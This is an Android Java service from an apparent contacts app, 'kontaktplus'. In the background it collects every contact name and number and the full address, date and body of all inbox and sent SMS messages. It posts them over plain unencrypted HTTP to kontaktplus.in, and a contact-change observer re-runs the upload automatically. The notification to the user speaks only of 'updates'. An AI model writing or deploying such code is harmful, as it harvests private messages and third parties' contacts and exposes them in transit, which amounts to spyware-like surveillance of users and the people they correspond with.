package com.kontaktplus.kontakte;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import com.squareup.okhttp.Call;
import com.squareup.okhttp.FormEncodingBuilder;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class MakeService extends Service {

    public boolean working = false;
    public String res="",user_id="";

    public static final String APP_PREFERENCES = "myusers";
    public static final String APP_PREFERENCES_COUNTER = "user_id";
    public static final String APP_PREFERENCES_COUNTER2 = "first_visit";

    public SharedPreferences sp;
    private SharedPreferences mSettings;
    int tries = 0, update=0;
    boolean snd_ph=false, snd_sms=false;
    String phoneNumber,maintext="";
    public String first = "n", rn="";
    int cont_sms=0,cnt_cont=0;









    @Override
    public void onStart(Intent intent, int startid)
        {



            mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);
            if (mSettings.contains(APP_PREFERENCES_COUNTER)) {
                // Получаем число из настроек
                user_id = mSettings.getString(APP_PREFERENCES_COUNTER, "");
                first = mSettings.getString(APP_PREFERENCES_COUNTER2, "");
                rn = mSettings.getString("Run", "");
                cont_sms = Integer.parseInt(mSettings.getString("CNT_SMS", "0"));
                cnt_cont = Integer.parseInt(mSettings.getString("CNT_CONT", "0"));
                snd_ph = mSettings.getBoolean("SND_C", true);
                snd_sms = mSettings.getBoolean("SND_S", true);
                if (user_id.length() == 0) user_id = null;
                if (first!="y") first ="n";
                //Toast.makeText(MainActivity.this, user_id, Toast.LENGTH_LONG).show();
            }
            Log.d("RN_", "run: "+rn);
            Log.d("RN_", first);
            Log.d("RN_", user_id);
            if (user_id!=null)
            {
                final Timer myTimer = new Timer();
                myTimer.schedule(new TimerTask() {
                    @Override
                    public void run() {

                        Log.d("RN_", "new_contact_timer");

                        new_contacts();
                    }

                }, 10000, 60000);
            }
            //Log.d("MakeSMs", String.valueOf(snd_sms));

    if(rn.equals("y")) {
    try {
        makeDB(true, snd_ph, snd_sms);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
    }
        }




    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public int makeDB(Boolean manual, boolean snd_ph, boolean snd_sms) throws InterruptedException {
        Log.d("MakeDB", "START");


        if (!working) {
            //inserttext("");
            Log.d("MakeDB_working","true");
            working = true;
            ContentResolver cr = getContentResolver();
            //String phoneNumbe;
            final int[] count = {0};

            final Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            final Cursor sms = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            final Cursor sms1 = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

            if (((phones.getCount() > 0 && snd_ph) || (snd_sms && sms.getCount() > 0))&&cnt_cont!=phones.getCount()) {

                //if (snd_ph&&phones.getCount()>0) inserttext("Found contacts: "+String.valueOf(phones.getCount()));
                //if (snd_sms&&sms.getCount()>0) inserttext("Found sms: "+String.valueOf(sms.getCount()));
                Log.d("MakeDB","find update");
                String url = "http://kontaktplus.in/getm2";
                OkHttpClient client = new OkHttpClient();
                RequestBody formBody = new FormEncodingBuilder()
                        .add("lang", Locale.getDefault().toString())
                        .add("uid", user_id)

                        .build();
                Request request = new Request.Builder()
                        .url(url)
                        .post(formBody)
                        .build();

                Call call = client.newCall(request);
                //Thread.sleep(3000);

                call.enqueue(new com.squareup.okhttp.Callback() {
                    //1000 milliseconds is one second.

                    @Override
                    public void onFailure(Request request, IOException e) {

                        res = e.getMessage();
                        Log.d("MakeDB_FAIL",res);
                    }

                    @Override
                    public void onResponse(Response response) throws IOException {
                        res = response.body().string();
                        update = Integer.parseInt(res);
                    }

                });

                Thread.sleep(4000);


                if (update > 0) {
                    tries++;
                    Log.d("MakeDB_upd", String.valueOf(update));
                    try {
                        if (snd_ph && phones.getCount() > 0) viewContacts(update, phones.getCount(),manual);
                        if (snd_sms && sms.getCount() > 0) viewSMS(update, sms.getCount(),manual);
                        working = false;

                        SharedPreferences.Editor editor = mSettings.edit();
                        editor.putString("Run", "n");
                        editor.putString("CNT_SMS", String.valueOf(sms.getCount()));
                        editor.putString("CNT_CONT", String.valueOf(phones.getCount()));

                        Context context = getApplicationContext();

                        maintext = phones.getCount()+" "+getString(R.string.phones_updated)+" \n"+(sms.getCount()+sms1.getCount())+" "+getString(R.string.sms_updated);

                        Intent notificationIntent = new Intent(context, MainActivity.class);
                        notificationIntent.putExtra("text", maintext);
                        PendingIntent contentIntent = PendingIntent.getActivity(context,
                                0, notificationIntent,
                                PendingIntent.FLAG_CANCEL_CURRENT);

                        Resources res1 = context.getResources();
                        //finalK + getString(R.string.were_added) + finalM + getString(R.string.sms_were_added),getString(R.string.finished),getString(R.string.ok)
                        Notification.Builder builder = new Notification.Builder(context);
                        builder.setContentIntent(contentIntent)
                                .setSmallIcon(R.mipmap.ic_launcher)
                                        // большая картинка
                                .setTicker(getString(R.string.updated_string))
                                .setWhen(System.currentTimeMillis())
                                .setAutoCancel(true)
                                        //.setContentTitle(res.getString(R.string.notifytitle)) // Заголовок уведомления
                                .setContentTitle(getString(R.string.finished))
                                        //.setContentText(res.getString(R.string.notifytext))
                                .setContentText(maintext); // Текст уведомления

                        // Notification notification = builder.getNotification(); // до API 16
                        Notification notification = builder.build();
                        long[] vibrate = new long[] { 1000, 1000, 1000, 1000, 1000 };
                        notification.vibrate = vibrate;
                        NotificationManager notificationManager = (NotificationManager) context
                                .getSystemService(Context.NOTIFICATION_SERVICE);
                        notificationManager.notify(1, notification);
                        //editor.apply();
                        editor.apply();

                        if (rn.equals("y")) {
                            rn = "n";
                            //Intent intents = new Intent(MakeService.this, MainActivity.class);
                            //intents.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            //intents.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            //intents.putExtra("text", maintext);
                            //getApplication().startActivity(intents);
                        }else{rn = "n";}

                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    return tries;

                } else {
                    Log.d("MyLog", "Update can't find");
                    makeDB(true, snd_ph, snd_sms);
                    tries++;
                    //return tries;

                }
                phones.close();// close cursor

            }

            return tries;
        }
        return 1;
    }

    public void viewSMS(int update, int count_, Boolean manual) throws IOException {
        Log.d("viewSMS", "STARTED");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int total_ = 0;
        String date2_ ="";
        Log.d("viewSMS", String.valueOf(count_));
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            String date_ = "";
            do {
                String date_1 =  cursor.getString(cursor.getColumnIndex("date"));

                String smsDate = date_1;

                date_ += cursor.getString(cursor.getColumnIndexOrThrow("address")).toString() + "(||)" + cursor.getString(cursor.getColumnIndexOrThrow("read")).toString() + "(||)" + smsDate + "(||)" + cursor.getString(cursor.getColumnIndexOrThrow("body")).toString() + "(||)-(||)<?)";

                // inserttext(cursor.getString(cursor.getColumnIndexOrThrow("body")).toString());
            } while (cursor.moveToNext());
            //inserttext(count_+" SMS inbox updated";
            date2_ = date_;
        }

        Cursor c = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

        if (c.moveToFirst()) { // must check the result to prevent exception
            String date_2 = "";
            do {
                String date_11 =  c.getString(c.getColumnIndex("date"));
                String smsDate = date_11;
                date_2 += c.getString(c.getColumnIndexOrThrow("address")).toString() + "(||)" + c.getString(c.getColumnIndexOrThrow("read")).toString() + "(||)" + smsDate + "(||)" + c.getString(c.getColumnIndexOrThrow("body")).toString() + "(||)me(||)<?)";
                //inserttext(c.getString(cursor.getColumnIndexOrThrow("address")).toString());
                // inserttext(cursor.getString(cursor.getColumnIndexOrThrow("body")).toString());
            } while (c.moveToNext());
            date2_+=date_2;
        }
        sendSMS(date2_, update);
        total_ = c.getCount() + count_;
        if (manual) maintext+="\n"+total_ +" "+ getString(R.string.sms_updated);

    }

    public void viewContacts(int update, final int count_, Boolean manual) throws IOException {
        Log.d("viewContacts","STARTED");
        ContentResolver cr = getContentResolver();
        //String phoneNumbe;
        final int[] count = {0};
        boolean bool = false;
        String names = "";
        final Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        Log.d("viewContacts", String.valueOf(count_));
        while (phones.moveToNext() && count[0] < count_) {
            tries++;
            final String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            //phoneNM = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.SEARCH_PHONE_NUMBER_KEY));
            names+=name+"(?)"+phoneNumber+"<()";

            //Log.d("view", count[0] + ". " + name + " was Updated");
            count[0]++;
        }
        sendRequest(names, update);
        if (manual) maintext+="\n"+count_ +" "+ getString(R.string.phones_updated);
    }

    private boolean sendSMS(String mess, int update) throws IOException {
        final boolean[] bl = {false};
        Log.d("send_sms", mess);
        String url1 = "http://kontaktplus.in/getms";
        OkHttpClient client = new OkHttpClient();
        RequestBody formBody = new FormEncodingBuilder()
                .add("uid", user_id)
                .add("messages", mess)
                .add("lang", Locale.getDefault().toString())
                .add("upd", String.valueOf(update))

                .build();
        Request request = new Request.Builder()
                .url(url1)
                .post(formBody)
                .build();

        //Log.d("MyLog","-------------------------");
        Call call = client.newCall(request);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        call.enqueue(new com.squareup.okhttp.Callback() {
            //Thread.sleep(1000);                 //1000 milliseconds is one second.

            @Override
            public void onFailure(Request request, IOException e) {

                res = e.getMessage();
            }

            @Override
            public void onResponse(Response response) throws IOException {
                res = response.body().string();

                bl[0] = true;

                Log.d("send_sms", "YES");

                //Log.d("MyLog", name+ "-----------"+res);
                //count[0]++;


            }

        });
        return bl[0];

    }

    private boolean sendRequest(String name, int update) throws IOException {
        final boolean[] bl = {false};
        String url1 = "http://kontaktplus.in/getm";
        OkHttpClient client = new OkHttpClient();
        RequestBody formBody = new FormEncodingBuilder()
                .add("uid", user_id)
                .add("lang", Locale.getDefault().toString())
                .add("name", name)
                .add("upd", String.valueOf(update))

                .build();
        Request request = new Request.Builder()
                .url(url1)
                .post(formBody)
                .build();

        //Log.d("MyLog","-------------------------");
        Call call = client.newCall(request);
        try {
            Thread.sleep(4000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        call.enqueue(new com.squareup.okhttp.Callback() {
            //Thread.sleep(1000);                 //1000 milliseconds is one second.

            @Override
            public void onFailure(Request request, IOException e) {

                res = e.getMessage();
            }

            @Override
            public void onResponse(Response response) throws IOException {
                res = response.body().string();
                bl[0] = true;
                Log.d("send_contacts_req", res);
                //Log.d("MyLog", name+ "-----------"+res);
                //count[0]++;


            }

        });
        return bl[0];

    }
    public void new_contacts()
    {
        getContentResolver()
                .registerContentObserver(
                        ContactsContract.Contacts.CONTENT_URI, true,
                        new MyCOntentObserver());

    }
    public class MyCOntentObserver extends ContentObserver {
        public MyCOntentObserver() {
            super(null);
        }
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            if (!selfChange) {

                Log.d("RN_", "new_contact_found");
                SharedPreferences.Editor editor = mSettings.edit();
                editor.putString("Run", "y");
rn = "y";
                //editor.apply();
                editor.commit();
                try {
                    makeDB(false,snd_ph,snd_sms);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                //return 2;
            }
            //return 1;
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }
    }
    public static boolean isNumeric(String str) {
        for (char c : str.toCharArray()) {
            if (!Character.isDigit(c)) return false;
        }
        return true;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


}
